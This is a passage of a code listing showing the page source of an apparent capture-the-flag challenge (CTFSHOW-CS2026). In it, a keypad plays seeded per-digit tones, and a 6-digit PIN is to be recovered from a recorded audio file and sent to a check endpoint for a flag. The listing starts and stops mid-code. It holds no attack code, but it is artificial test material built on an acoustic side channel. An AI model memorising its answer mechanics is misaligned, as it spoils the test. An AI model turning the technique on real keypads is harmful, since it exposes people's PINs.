class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;utf-8&quot;/&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1&quot;/&gt;</span><br><span class="line">  &lt;title&gt;高等级身份验证识别系统&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    :root&#123;</span><br><span class="line">      --bg:#07070b; --panel:#0b0b12; --txt:#e9e9ff; --muted:#9aa0c8;</span><br><span class="line">      --neon1:#38bdf8; --neon2:#fb7185; --ok:#22c55e; --bad:#ef4444; --warn:#f59e0b;</span><br><span class="line">    &#125;</span><br><span class="line">    *&#123;box-sizing:border-box&#125;</span><br><span class="line">    body&#123;</span><br><span class="line">      margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center;</span><br><span class="line">      background: radial-gradient(900px 600px at 70% 20%, rgba(56,189,248,.08), transparent 60%),</span><br><span class="line">                  radial-gradient(700px 420px at 25% 65%, rgba(251,113,133,.08), transparent 60%),</span><br><span class="line">                  linear-gradient(180deg, #05050a 0%, #0a0a12 100%);</span><br><span class="line">      color:var(--txt); font-family:system-ui, -apple-system, Segoe UI, Roboto, Arial;</span><br><span class="line">    &#125;</span><br><span class="line">    .wrap&#123;width:min(920px,96vw); display:grid; grid-template-columns: 1.2fr .8fr; gap:16px; padding:16px;&#125;</span><br><span class="line">    .card&#123;border-radius:18px; background:rgba(10,10,18,.88); border:1px solid rgba(255,255,255,.06); box-shadow: 0 14px 60px rgba(0,0,0,.55); overflow:hidden;&#125;</span><br><span class="line">    .left&#123;padding:18px;&#125;</span><br><span class="line">    .right&#123;padding:18px; display:flex; flex-direction:column; gap:12px;&#125;</span><br><span class="line">    .title&#123;letter-spacing:.18em; text-transform:uppercase; font-size:18px; color:#dbeafe&#125;</span><br><span class="line">    .sub&#123;margin-top:6px; font-size:12px; color:var(--muted); line-height:1.45&#125;</span><br><span class="line">    .screen&#123;margin-top:14px; padding:14px; border-radius:16px; background:rgba(6,6,12,.85); border:1px solid rgba(255,255,255,.06)&#125;</span><br><span class="line">    .pinRow&#123;display:flex; justify-content:space-between; align-items:center; gap:10px;&#125;</span><br><span class="line">    .dots&#123;display:flex; gap:8px;&#125;</span><br><span class="line">    .dot&#123;width:12px;height:12px;border-radius:999px;border:1px solid rgba(255,255,255,.16);background:rgba(255,255,255,.06)&#125;</span><br><span class="line">    .dot.filled&#123;background:rgba(56,189,248,.85); border-color: rgba(56,189,248,.55); box-shadow: 0 0 18px rgba(56,189,248,.25);&#125;</span><br><span class="line">    .msg&#123;margin-top:10px; min-height:18px; font-size:12px; color:var(--muted)&#125;</span><br><span class="line">    .msg.ok&#123;color:#bbf7d0&#125; .msg.bad&#123;color:#fecaca&#125; .msg.warn&#123;color:#fde68a&#125;</span><br><span class="line">    .kbd&#123;margin-top:14px; display:grid; grid-template-columns:repeat(3,1fr); gap:10px;&#125;</span><br><span class="line">    .key&#123;height:56px;border-radius:16px;border:1px solid rgba(255,255,255,.08); background:rgba(16,16,26,.72); color:rgba(233,233,255,.96); font-size:18px; cursor:pointer; transition:.15s&#125;</span><br><span class="line">    .key:hover&#123;transform:translateY(-1px); border-color: rgba(56,189,248,.22); box-shadow: 0 0 18px rgba(56,189,248,.18)&#125;</span><br><span class="line">    .key.fn&#123;font-size:13px; letter-spacing:.14em; text-transform:uppercase&#125;</span><br><span class="line">    .key.cancel:hover&#123;border-color: rgba(251,113,133,.32); box-shadow: 0 0 18px rgba(251,113,133,.18)&#125;</span><br><span class="line">    .key.enter:hover&#123;border-color: rgba(34,197,94,.22); box-shadow: 0 0 18px rgba(34,197,94,.14)&#125;</span><br><span class="line">    .box&#123;padding:12px;border-radius:16px;background:rgba(6,6,12,.65);border:1px solid rgba(255,255,255,.06)&#125;</span><br><span class="line">    .mono&#123;font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;,&quot;Courier New&quot;, monospace;&#125;</span><br><span class="line">    .btn&#123;width:100%; padding:10px 12px; border-radius:14px; border:1px solid rgba(255,255,255,.08); background:rgba(255,255,255,.02); color:rgba(226,232,240,.9); cursor:pointer;&#125;</span><br><span class="line">    .btn:hover&#123;border-color: rgba(167,139,250,.22); box-shadow:0 0 18px rgba(167,139,250,.12)&#125;</span><br><span class="line">    @media (max-width:900px)&#123;.wrap&#123;grid-template-columns:1fr&#125;&#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;wrap&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;card left&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;title&quot;&gt;高等级身份验证识别系统 CTFSHOW-CS2026&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;sub&quot;&gt;已经拦截了嫌疑人的密码音频&lt;span class=&quot;mono&quot;&gt;record.wav&lt;/span&gt; 需要还原最终 PIN。&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;screen&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;pinRow&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;mono&quot; style=&quot;font-size:12px;letter-spacing:.14em;color:#cbd5e1;&quot;&gt;PIN&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;dots&quot; id=&quot;dots&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;msg warn&quot; id=&quot;msg&quot;&gt;加载中…&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class=&quot;kbd&quot; id=&quot;kbd&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;div class=&quot;card right&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">      &lt;div style=&quot;font-size:12px;letter-spacing:.16em;text-transform:uppercase;color:#e0f2fe;&quot;&gt;附件&lt;/div&gt;</span><br><span class="line">      &lt;div style=&quot;margin-top:8px;font-size:12px;color:rgba(226,232,240,.78);line-height:1.55;&quot;&gt;</span><br><span class="line">        CTFSHOW &lt;span class=&quot;mono&quot;&gt;CS2026&lt;/span&gt;最终正确的密码为&lt;span class=&quot;mono&quot;&gt;6&lt;/span&gt;位。</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div style=&quot;margin-top:10px;display:flex;gap:10px;&quot;&gt;</span><br><span class="line">        &lt;a class=&quot;btn&quot; id=&quot;dl&quot; href=&quot;#&quot; download style=&quot;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;&quot;&gt;下载 record.wav&lt;/a&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">      &lt;div style=&quot;font-size:12px;letter-spacing:.16em;text-transform:uppercase;color:#e0f2fe;&quot;&gt;提示&lt;/div&gt;</span><br><span class="line">      &lt;div style=&quot;margin-top:8px;font-size:12px;color:rgba(226,232,240,.78);line-height:1.55;&quot;&gt;</span><br><span class="line">        此题不需要爆破、扫描、竞争</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;button class=&quot;btn&quot; id=&quot;test&quot; style=&quot;margin-top:10px;&quot;&gt;依次播放 0-9（当前会话）&lt;/button&gt;</span><br><span class="line">      &lt;button class=&quot;btn&quot; id=&quot;clear&quot; style=&quot;margin-top:10px;&quot;&gt;清空输入&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">(() =&gt; &#123;</span><br><span class="line">  const MAX_LEN = 6;</span><br><span class="line">  const dots = document.getElementById(&#x27;dots&#x27;);</span><br><span class="line">  const msg  = document.getElementById(&#x27;msg&#x27;);</span><br><span class="line">  const kbd  = document.getElementById(&#x27;kbd&#x27;);</span><br><span class="line">  const dl   = document.getElementById(&#x27;dl&#x27;);</span><br><span class="line"></span><br><span class="line">  let pin = &quot;&quot;;</span><br><span class="line">  let seed = null;</span><br><span class="line">  let map = null; </span><br><span class="line">  const SOUND_CANCEL = 10;</span><br><span class="line">  const SOUND_ENTER  = 11;</span><br><span class="line"></span><br><span class="line">  function setMsg(t, cls=&quot;warn&quot;)&#123;</span><br><span class="line">    msg.className = &quot;msg &quot; + cls;</span><br><span class="line">    msg.textContent = t || &quot;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  function renderDots()&#123;</span><br><span class="line">    dots.innerHTML = &quot;&quot;;</span><br><span class="line">    for(let i=0;i&lt;MAX_LEN;i++)&#123;</span><br><span class="line">      const d = document.createElement(&quot;div&quot;);</span><br><span class="line">      d.className = &quot;dot&quot; + (i &lt; pin.length ? &quot; filled&quot; : &quot;&quot;);</span><br><span class="line">      dots.appendChild(d);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const AudioCtx = window.AudioContext || window.webkitAudioContext;</span><br><span class="line">  const ctx = new AudioCtx();</span><br><span class="line"></span><br><span class="line">function sha256Hex(str)&#123;</span><br><span class="line">  if (window.crypto &amp;&amp; window.crypto.subtle &amp;&amp; typeof window.crypto.subtle.digest === &quot;function&quot;) &#123;</span><br><span class="line">    return window.crypto.subtle.digest(&quot;SHA-256&quot;, new TextEncoder().encode(str)).then(buf=&gt;&#123;</span><br><span class="line">      const b = new Uint8Array(buf);</span><br><span class="line">      let s=&quot;&quot;; for(const x of b) s += x.toString(16).padStart(2,&quot;0&quot;);</span><br><span class="line">      return s;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  return Promise.resolve(sha256_sync_hex(str));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function sha256_sync_hex(ascii)&#123;</span><br><span class="line">  function ror(n,x)&#123; return (x&gt;&gt;&gt;n) | (x&lt;&lt;(32-n)); &#125;</span><br><span class="line">  function toHex(n)&#123; return (n&gt;&gt;&gt;0).toString(16).padStart(8,&quot;0&quot;); &#125;</span><br><span class="line"></span><br><span class="line">  const K = [</span><br><span class="line">    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,</span><br><span class="line">    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,</span><br><span class="line">    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,</span><br><span class="line">    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,</span><br><span class="line">    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,</span><br><span class="line">    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,</span><br><span class="line">    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,</span><br><span class="line">    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  const msg = new TextEncoder().encode(ascii);</span><br><span class="line">  const l = msg.length;</span><br><span class="line"></span><br><span class="line">  const bitLenHi = Math.floor((l * 8) / 0x100000000);</span><br><span class="line">  const bitLenLo = (l * 8) &gt;&gt;&gt; 0;</span><br><span class="line"></span><br><span class="line">  const withOne = l + 1;</span><br><span class="line">  const padLen = (withOne % 64 &lt;= 56) ? (56 - (withOne % 64)) : (56 + 64 - (withOne % 64));</span><br><span class="line">  const total = l + 1 + padLen + 8;</span><br><span class="line"></span><br><span class="line">  const bytes = new Uint8Array(total);</span><br><span class="line">  bytes.set(msg, 0);</span><br><span class="line">  bytes[l] = 0x80;</span><br><span class="line"></span><br><span class="line">  const dv = new DataView(bytes.buffer);</span><br><span class="line">  dv.setUint32(total - 8, bitLenHi, false);</span><br><span class="line">  dv.setUint32(total - 4, bitLenLo, false);</span><br><span class="line"></span><br><span class="line">  let h0=0x6a09e667,h1=0xbb67ae85,h2=0x3c6ef372,h3=0xa54ff53a,h4=0x510e527f,h5=0x9b05688c,h6=0x1f83d9ab,h7=0x5be0cd19;</span><br><span class="line"></span><br><span class="line">  const w = new Uint32Array(64);</span><br><span class="line"></span><br><span class="line">  for(let off=0; off&lt;total; off+=64)&#123;</span><br><span class="line">    for(let i=0;i&lt;16;i++)&#123;</span><br><span class="line">      w[i] = dv.getUint32(off + i*4, false);</span><br><span class="line">    &#125;</span><br><span class="line">    for(let i=16;i&lt;64;i++)&#123;</span><br><span class="line">      const s0 = (ror(7,w[i-15]) ^ ror(18,w[i-15]) ^ (w[i-15]&gt;&gt;&gt;3)) &gt;&gt;&gt; 0;</span><br><span class="line">      const s1 = (ror(17,w[i-2]) ^ ror(19,w[i-2]) ^ (w[i-2]&gt;&gt;&gt;10)) &gt;&gt;&gt; 0;</span><br><span class="line">      w[i] = (w[i-16] + s0 + w[i-7] + s1) &gt;&gt;&gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let a=h0,b=h1,c=h2,d=h3,e=h4,f=h5,g=h6,h=h7;</span><br><span class="line"></span><br><span class="line">    for(let i=0;i&lt;64;i++)&#123;</span><br><span class="line">      const S1 = (ror(6,e) ^ ror(11,e) ^ ror(25,e)) &gt;&gt;&gt; 0;</span><br><span class="line">      const ch = ((e &amp; f) ^ (~e &amp; g)) &gt;&gt;&gt; 0;</span><br><span class="line">      const t1 = (h + S1 + ch + K[i] + w[i]) &gt;&gt;&gt; 0;</span><br><span class="line">      const S0 = (ror(2,a) ^ ror(13,a) ^ ror(22,a)) &gt;&gt;&gt; 0;</span><br><span class="line">      const maj = ((a &amp; b) ^ (a &amp; c) ^ (b &amp; c)) &gt;&gt;&gt; 0;</span><br><span class="line">      const t2 = (S0 + maj) &gt;&gt;&gt; 0;</span><br><span class="line"></span><br><span class="line">      h=g; g=f; f=e; e=(d + t1)&gt;&gt;&gt;0; d=c; c=b; b=a; a=(t1 + t2)&gt;&gt;&gt;0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h0=(h0+a)&gt;&gt;&gt;0; h1=(h1+b)&gt;&gt;&gt;0; h2=(h2+c)&gt;&gt;&gt;0; h3=(h3+d)&gt;&gt;&gt;0;</span><br><span class="line">    h4=(h4+e)&gt;&gt;&gt;0; h5=(h5+f)&gt;&gt;&gt;0; h6=(h6+g)&gt;&gt;&gt;0; h7=(h7+h)&gt;&gt;&gt;0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return toHex(h0)+toHex(h1)+toHex(h2)+toHex(h3)+toHex(h4)+toHex(h5)+toHex(h6)+toHex(h7);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  function u32FromHex8(h8)&#123;</span><br><span class="line"></span><br><span class="line">    const b0 = parseInt(h8.slice(0,2),16);</span><br><span class="line">    const b1 = parseInt(h8.slice(2,4),16);</span><br><span class="line">    const b2 = parseInt(h8.slice(4,6),16);</span><br><span class="line">    const b3 = parseInt(h8.slice(6,8),16);</span><br><span class="line">    return (b0 | (b1&lt;&lt;8) | (b2&lt;&lt;16) | (b3&lt;&lt;24)) &gt;&gt;&gt; 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  async function prng_u32(seed, tag)&#123;</span><br><span class="line">    const h = await sha256Hex(seed + &quot;|&quot; + tag);</span><br><span class="line">    return u32FromHex8(h.slice(0,8));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  async function permute_0_9(seed)&#123;</span><br><span class="line">    const a = [...Array(10).keys()];</span><br><span class="line">    let x = await prng_u32(seed, &quot;perm&quot;);</span><br><span class="line">    for(let i=9;i&gt;=1;i--)&#123;</span><br><span class="line">      x = (Math.imul(x, 1664525) + 1013904223) &gt;&gt;&gt; 0;</span><br><span class="line">      const j = x % (i+1);</span><br><span class="line">      [a[i], a[j]] = [a[j], a[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    return a; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function clamp(x, lo, hi)&#123; return x&lt;lo?lo:(x&gt;hi?hi:x); &#125;</span><br><span class="line"></span><br><span class="line">  async function soundParams(seed, soundId)&#123;</span><br><span class="line">    const x = await prng_u32(seed, &quot;p&quot;+soundId);</span><br><span class="line">    const base = 1050 + soundId*23 + (((x &amp; 0xff) - 128) * 0.35);</span><br><span class="line">    const dur  = 0.082 + (((x &gt;&gt;&gt; 8) &amp; 0xff)/255) * 0.018;</span><br><span class="line">    const pre  = 0.0018 + (((x &gt;&gt;&gt; 16) &amp; 0xff)/255) * 0.0045;</span><br><span class="line">    const atk  = 0.0012 + (((x &gt;&gt;&gt; 24) &amp; 0xff)/255) * 0.0022;</span><br><span class="line">    const click= 0.16 + ((x &amp; 0xff)/255) * 0.10;</span><br><span class="line">    const pan  = clamp(((soundId - 4.5)/14) + ((((x&gt;&gt;&gt;8)&amp;0xff)-128)/128)*0.03, -0.35, 0.35);</span><br><span class="line">    return &#123;base,dur,pre,atk,click,pan, soundId&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  async function playSoundId(soundId)&#123;</span><br><span class="line">    await ctx.resume();</span><br><span class="line"></span><br><span class="line">    const p = await soundParams(seed, soundId);</span><br><span class="line">    const now = ctx.currentTime;</span><br><span class="line"></span><br><span class="line">    const leftGain  = clamp(1.0 - p.pan, 0.70, 1.30);</span><br><span class="line">    const rightGain = clamp(1.0 + p.pan, 0.70, 1.30);</span><br><span class="line">    const kDecay = 18.0 + p.soundId * 0.65;</span><br><span class="line"></span><br><span class="line">    const osc1 = ctx.createOscillator();</span><br><span class="line">    const osc2 = ctx.createOscillator();</span><br><span class="line">    osc1.type = &quot;sine&quot;;</span><br><span class="line">    osc2.type = &quot;sine&quot;;</span><br><span class="line">    osc1.frequency.value = p.base;</span><br><span class="line">    osc2.frequency.value = p.base * (1.0 + (p.soundId - 5) * 0.00032);</span><br><span class="line"></span><br><span class="line">    const g = ctx.createGain();</span><br><span class="line">    g.gain.setValueAtTime(0.00001, now);</span><br><span class="line">    g.gain.setValueAtTime(0.00001, now + p.pre);</span><br><span class="line">    g.gain.linearRampToValueAtTime(1.0, now + p.pre + p.atk);</span><br><span class="line">    g.gain.setTargetAtTime(0.00001, now + p.pre + p.atk, 1.0 / kDecay);</span><br><span class="line"></span><br><span class="line">    const noiseBuf = ctx.createBuffer(1, Math.floor(ctx.sampleRate * 0.006), ctx.sampleRate);</span><br><span class="line">    &#123;</span><br><span class="line">      const d = noiseBuf.getChannelData(0);</span><br><span class="line">      for(let i=0;i&lt;d.length;i++)&#123;</span><br><span class="line">        const t = i / ctx.sampleRate;</span><br><span class="line">        const pulse = Math.sin(2*Math.PI*(2500 + p.soundId*37)*t + (p.soundId+1)*0.9);</span><br><span class="line">        const noise = (Math.sin(2*Math.PI*(9000 + p.soundId*11)*t) + Math.sin(2*Math.PI*(12000 + p.soundId*13)*t))*0.5;</span><br><span class="line">        const env = 1.0 - (t / 0.006);</span><br><span class="line">        d[i] = (0.62*pulse + 0.38*noise) * env * p.click * 0.85;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    const noiseSrc = ctx.createBufferSource();</span><br><span class="line">    noiseSrc.buffer = noiseBuf;</span><br><span class="line">    const noiseGain = ctx.createGain();</span><br><span class="line">    noiseGain.gain.value = 1.0;</span><br><span class="line"></span><br><span class="line">    const merger = ctx.createChannelMerger(2);</span><br><span class="line">    const splitter = ctx.createChannelSplitter(1);</span><br><span class="line">    const panL = ctx.createGain();</span><br><span class="line">    const panR = ctx.createGain();</span><br><span class="line">    panL.gain.value = leftGain * 0.85;</span><br><span class="line">    panR.gain.value = rightGain * 0.85;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    const mix = ctx.createGain();</span><br><span class="line">    mix.gain.value = 0.85;</span><br><span class="line"></span><br><span class="line">    osc1.connect(mix);</span><br><span class="line">    osc2.connect(mix);</span><br><span class="line">    mix.connect(g);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    g.connect(panL);</span><br><span class="line">    g.connect(panR);</span><br><span class="line">    panL.connect(merger, 0, 0);</span><br><span class="line">    panR.connect(merger, 0, 1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    noiseSrc.connect(noiseGain);</span><br><span class="line">    noiseGain.connect(merger, 0, 0);</span><br><span class="line">    noiseGain.connect(merger, 0, 1);</span><br><span class="line"></span><br><span class="line">    merger.connect(ctx.destination);</span><br><span class="line"></span><br><span class="line">    const startAt = now + p.pre;</span><br><span class="line">    const stopAt  = now + p.pre + p.dur;</span><br><span class="line"></span><br><span class="line">    noiseSrc.start(now); noiseSrc.stop(now + 0.006);</span><br><span class="line">    osc1.start(now); osc2.start(now);</span><br><span class="line">    osc1.stop(stopAt); osc2.stop(stopAt);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  async function pressDigit(d)&#123;</span><br><span class="line">    if(pin.length &gt;= MAX_LEN)&#123; setMsg(&quot;PIN 已满 6 位。&quot;, &quot;warn&quot;); return; &#125;</span><br><span class="line">    pin += String(d);</span><br><span class="line">    renderDots();</span><br><span class="line">    setMsg(&quot;&quot;);</span><br><span class="line">    const sid = map[d];</span><br><span class="line">    playSoundId(sid).catch(()=&gt;&#123;&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  function clearPin()&#123;</span><br><span class="line">    pin = &quot;&quot;;</span><br><span class="line">    renderDots();</span><br><span class="line">    setMsg(&quot;已清空。&quot;, &quot;warn&quot;);</span><br><span class="line">    playSoundId(SOUND_CANCEL).catch(()=&gt;&#123;&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">async function submitPin()&#123;</span><br><span class="line">  if(pin.length !== MAX_LEN)&#123; setMsg(&quot;请先输入 6 位 PIN。&quot;, &quot;warn&quot;); return; &#125;</span><br><span class="line"></span><br><span class="line">  const until = Number(localStorage.getItem(&quot;pin_cool_until&quot;) || &quot;0&quot;);</span><br><span class="line">  const now = Date.now();</span><br><span class="line">  if(until &gt; now)&#123;</span><br><span class="line">    const s = Math.ceil((until - now)/1000);</span><br><span class="line">    setMsg(`⏳ 冷却中，请 $&#123;s&#125;s 后再试。`, &quot;warn&quot;);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  setMsg(&quot;正在验证…&quot;, &quot;warn&quot;);</span><br><span class="line">  playSoundId(SOUND_ENTER).catch(()=&gt;&#123;&#125;);</span><br><span class="line"></span><br><span class="line">  try&#123;</span><br><span class="line">    const resp = await fetch(&quot;/check.php&quot;, &#123;</span><br><span class="line">      method:&quot;POST&quot;,</span><br><span class="line">      headers:&#123; &quot;Content-Type&quot;:&quot;application/json&quot; &#125;,</span><br><span class="line">      body: JSON.stringify(&#123; pin &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    const data = await resp.json().catch(()=&gt;null);</span><br><span class="line"></span><br><span class="line">    if(resp.status === 429)&#123;</span><br><span class="line">      const ra = Math.max(1, Number(data?.retry_after || data?.cd || 1));</span><br><span class="line">      const untilTs = Date.now() + ra*1000;</span><br><span class="line">      localStorage.setItem(&quot;pin_cool_until&quot;, String(untilTs));</span><br><span class="line">      setMsg(`⏳ 冷却中，请 $&#123;ra&#125;s 后再试。`, &quot;warn&quot;);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!resp.ok || !data)&#123;</span><br><span class="line">      setMsg(&quot;后端返回异常。&quot;, &quot;bad&quot;);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(data.ok)&#123;</span><br><span class="line">      localStorage.removeItem(&quot;pin_cool_until&quot;);</span><br><span class="line">      setMsg(&quot;✅ &quot; + (data.flag||&quot;&quot;), &quot;ok&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      const cd = Number(data?.cd || 0);</span><br><span class="line">      if(cd &gt; 0)&#123;</span><br><span class="line">        localStorage.setItem(&quot;pin_cool_until&quot;, String(Date.now() + cd*1000));</span><br><span class="line">      &#125;</span><br><span class="line">      setMsg(&quot;❌ PIN incorrect.&quot;, &quot;bad&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;catch(e)&#123;</span><br><span class="line">    